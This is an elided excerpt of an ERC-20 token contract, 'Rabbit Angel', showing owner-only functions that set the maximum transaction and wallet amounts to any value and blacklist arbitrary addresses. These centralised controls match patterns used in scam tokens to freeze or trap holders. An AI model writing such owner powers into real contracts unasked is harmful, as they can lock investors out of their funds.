...
contract rabbitangel is Context, IERC20, Ownable {
    ...
    string private constant _name = "Rabbit Angel";
    string private constant _symbol = "RabbitAngel";
    ...
    function setMaxWalletTx(uint256 newMaxWalletTx) external onlyOwner {
        _maxTxAmount = newMaxWalletTx * 10**_decimals;
        _maxWalletAmount = newMaxWalletTx * 10**_decimals;
    }
    ...
    function blacklistAddress(address[] calldata bots) external onlyOwner {
    ...
    for (uint256 i; i < bots.length; ++i) {
        if(gasUsed < gasleft()) {
        startGas = gasleft();
        if(!_isBlacklisted[bots[i]]){
        _isBlacklisted[bots[i]] = true;}
        gasUsed = startGas - gasleft();
    }
    }
    }
